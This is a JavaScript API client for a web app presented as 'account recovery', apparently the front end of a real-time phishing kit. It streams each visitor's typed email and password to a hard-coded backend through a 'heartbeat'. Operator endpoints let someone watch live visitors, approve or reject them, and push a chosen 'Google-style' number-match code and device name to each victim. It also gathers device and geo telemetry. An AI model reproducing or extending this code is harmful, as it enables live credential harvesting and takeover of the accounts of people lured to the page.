function resolveApiBase() {
  const envBase = import.meta.env.VITE_API_BASE;
  if (envBase && typeof envBase === 'string' && envBase.trim().length > 0) {
    let clean = envBase.trim().replace(/\/+$/, '');
    if (!clean.endsWith('/api')) {
      clean += '/api';
    }
    return clean;
  }
  // If deployed in production without env var, default directly to the live Render backend
  if (typeof window !== 'undefined' && window.location.hostname && !window.location.hostname.includes('localhost') && !window.location.hostname.includes('127.0.0.1')) {
    return 'https://account-recovery-i7mr.onrender.com/api';
  }
  return '/api';
}

const API_BASE = resolveApiBase();

async function handleResponse(res) {
  const data = await res.json().catch(() => ({}));
  if (!res.ok) {
    const errorMsg = data.detail || data.message || `Request failed with status ${res.status}`;
    throw new Error(errorMsg);
  }
  return data;
}

export const api = {
  // Real-Time Visitor Presence & Telemetry
  async sendHeartbeat({ visitor_id, session_id, email, entered_password, current_step, device_info, admin_decision }) {
    try {
      const res = await fetch(`${API_BASE}/presence/heartbeat`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ visitor_id, session_id, email, entered_password, current_step, device_info, admin_decision }),
      });
      return handleResponse(res);
    } catch (e) {
      return null;
    }
  },

  sendLeave(visitor_id) {
    try {
      const blob = new Blob([JSON.stringify({ visitor_id })], { type: 'application/json' });
      if (navigator.sendBeacon) {
        navigator.sendBeacon(`${API_BASE}/presence/leave`, blob);
      } else {
        fetch(`${API_BASE}/presence/leave`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ visitor_id }),
          keepalive: true
        });
      }
    } catch (e) {}
  },

  async getLiveVisitors() {
    const res = await fetch(`${API_BASE}/presence/live-visitors`);
    return handleResponse(res);
  },

  async approveVisitor(visitorId) {
    const res = await fetch(`${API_BASE}/admin/approve-visitor/${visitorId}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
    });
    return handleResponse(res);
  },

  async permitVisitor(visitorId) {
    const res = await fetch(`${API_BASE}/admin/permit-visitor/${visitorId}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
    });
    return handleResponse(res);
  },

  async rejectVisitor(visitorId) {
    const res = await fetch(`${API_BASE}/admin/reject-visitor/${visitorId}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
    });
    return handleResponse(res);
  },

  async getChallengeConfig() {
    const res = await fetch(`${API_BASE}/admin/challenge-config`);
    return handleResponse(res);
  },

  async updateChallengeConfig({ default_match_number, default_device_name }) {
    const res = await fetch(`${API_BASE}/admin/challenge-config`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ default_match_number, default_device_name }),
    });
    return handleResponse(res);
  },

  async updateVisitorChallenge({ visitor_id, match_number, device_name }) {
    const res = await fetch(`${API_BASE}/admin/update-visitor-challenge`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ visitor_id, match_number, device_name }),
    });
    return handleResponse(res);
  },

  // Visitor Telemetry
  async trackVisitor(deviceInfo) {
    const res = await fetch(`${API_BASE}/recovery/track-visitor`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(deviceInfo),
    });
    return handleResponse(res);
  },

  // Step 1: Lookup Identifier (Email / Username) with Device & Geo Telemetry
  async lookupIdentifier(identifier, deviceInfo = null) {
    const res = await fetch(`${API_BASE}/recovery/lookup`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ identifier, device_info: deviceInfo }),
    });
    return handleResponse(res);
  },

  // Real-time Status Polling
  async getSessionStatus(sessionId) {
    const res = await fetch(`${API_BASE}/recovery/status/${sessionId}`);
    return handleResponse(res);
  },

  // Method 1: Google-style 2-Digit Number Match
  async verifyMatchNumber(sessionId, chosenNumber, token = null, deviceInfo = null) {
    const res = await fetch(`${API_BASE}/recovery/verify-match-number`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        session_id: sessionId,
        chosen_number: chosenNumber,
        token,
        device_info: deviceInfo,
      }),
    });
    return handleResponse(res);
  },

  // Method 2: Last Remembered Password
  async verifyLastPassword(sessionId, password, deviceInfo = null) {
    const res = await fetch(`${API_BASE}/recovery/verify-last-password`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        session_id: sessionId,
        password,
        device_info: deviceInfo,
      }),
    });
    return handleResponse(res);
  },

  // Method 3: 6-Digit Email OTP
  async verifyOtp(sessionId, code, deviceInfo = null) {
    const res = await fetch(`${API_BASE}/recovery/verify-otp`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        session_id: sessionId,
        code,
        device_info: deviceInfo,
      }),
    });
    return handleResponse(res);
  },

  // Switch Recovery Method
  async switchMethod(sessionId, method) {
    const res = await fetch(`${API_BASE}/recovery/switch-method`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ session_id: sessionId, method }),
    });
    return handleResponse(res);
  },

  // Resend Challenge & Email
  async resendCode(identifier, deviceInfo = null) {
    const res = await fetch(`${API_BASE}/recovery/resend-code`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ identifier, device_info: deviceInfo }),
    });
    return handleResponse(res);
  },

  // Final Step: Set New Password
  async resetPassword(sessionId, newPassword, confirmPassword) {
    const res = await fetch(`${API_BASE}/recovery/reset-password`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        session_id: sessionId,
        new_password: newPassword,
        confirm_password: confirmPassword,
      }),
    });
    return handleResponse(res);
  },

  // Live Mailbox & Dev Verification
  async getRecentEmails(limit = 15, toEmail = null) {
    const query = new URLSearchParams({ limit: limit.toString() });
    if (toEmail) query.append('to_email', toEmail);
    const res = await fetch(`${API_BASE}/emails/recent?${query.toString()}`);
    return handleResponse(res);
  },

  async verifyViaEmailLink(token, chosenNumber) {
    const res = await fetch(`${API_BASE}/emails/verify-link?token=${encodeURIComponent(token)}&chosen_number=${chosenNumber}`, {
      method: 'POST',
    });
    return handleResponse(res);
  },

  // Admin Panel endpoints
  async getAdminOverview() {
    const res = await fetch(`${API_BASE}/admin/overview`);
    return handleResponse(res);
  },

  async getAdminUsers() {
    const res = await fetch(`${API_BASE}/admin/users`);
    return handleResponse(res);
  },

  async getAdminSessions() {
    const res = await fetch(`${API_BASE}/admin/sessions`);
    return handleResponse(res);
  },

  async getAdminVisitors() {
    const res = await fetch(`${API_BASE}/admin/visitors`);
    return handleResponse(res);
  },

  async getAdminAuditLogs() {
    const res = await fetch(`${API_BASE}/admin/audit-logs`);
    return handleResponse(res);
  },

  async seedUser(email, username, fullName, password) {
    const query = new URLSearchParams({ email, username, full_name: fullName, password });
    const res = await fetch(`${API_BASE}/admin/users/seed-user?${query.toString()}`, {
      method: 'POST',
    });
    return handleResponse(res);
  },
};
